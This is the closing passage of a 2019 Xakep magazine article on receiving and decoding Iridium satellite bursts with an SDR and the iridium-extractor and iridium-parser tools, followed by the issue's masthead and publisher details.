center_freq=16XXXXXXXX
device_args='rtl_tcp=127.0.0.1:1234'
# Automatic bandwidth
bandwidth=0
# LNA gain
gain=19
# Moderate gains
if_gain=30

4. Запустим запись пакетов командой


iridium‐extractor ‐D 4 examples/rtl_tcp.conf | grep "A:OK" > output.
bits

Число записанных пакетов (помеченных как ok) должно расти, как показано
на скриншоте.





                 Запись с помощью iridium‐extractor

Если надписи ok не появляются и на экра не одни нули, то дальше идти бес‐
полезно, надо разбираться, что не так. Чаще всего проблема в том, что ты
не активировал bias tee, а без него антенна работать не будет, или выб рал
неверную частоту.
  Запись можно оста новить на некоторое время. На выходе мы должны
получить файл output.bits, раз мер которого зависит от числа собранных
пакетов.
   5. Запустим  iridium-parser командой python  iridium‐parser.py
output.bits > output.parsed.
  Данные готовы. Для примера можно извлечь координаты пролетающих
спутников с помощью команды


grep ^IRA output.parsed | perl mkkml tracks > output.kml

Результат  обработки   записи,  впрочем,  довольно  сильно  зависит
от везения — обширный тра фик со спутников быва ет не всегда.


        WWW

                    •Описание  остальных  команд  для  работы
                         с Iridium


Кстати, интересно посмотреть сигналы Iridium самос тоятельно, без помощи
декодера. Как показывает прос мотр записи в программе Signals Analyzer,
данные передаются в виде коротких сигналов (burst) длиной около 9 мс.





                   Форма сигнала Iridium

Форма сигнала указывает на фазовую модуляцию. На картинке заметны два
вида сигналов, занимающих раз ную ширину спектра. Анализ на фазовой
плоскости показывает, что скорость переда чи широкого сигнала составля‐
ет 240 бит/с, это дает объем данных одного пакета примерно 2 Кбайт. Узко‐
полосный сигнал име ет ско рость в десять раз меньше, но передаются они
чаще.





     Вид сигнала на фазовой плос кости в программе Signals Analyzer


В ЗАВЕРШЕНИЕ
На этом мы закончим краткое знакомство с приемом спутниковых сигналов.
Разумеется, это далеко не все интерес ное, что может быть при нято из кос‐
моса. Например, весьма любопытен прием с метеоспутников изображений
высокого разрешения (HRPT, high‐resolution picture transmission).
  Для ознакомления можешь посмотреть подробный туториал по приему
американских метеоспутников GOES. К сожалению, в Европе эти спутники
практически не видны и находятся за горизонтом.
  На мой взгляд, тема спут никового приема довольно мало изучена: одни
хорошо уме ют паять антенны и усилители, но мало разбираются в цифровом
анализе сигналов, и наоборот — прог раммисты не очень любят паять. Но в
последнее время появились готовые и недорогие решения, которые работа‐
ют из коробки, так что тема, надеюсь, получит раз витие — может, в том числе
и благодаря читателям «Хакера».
    №01 (250)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019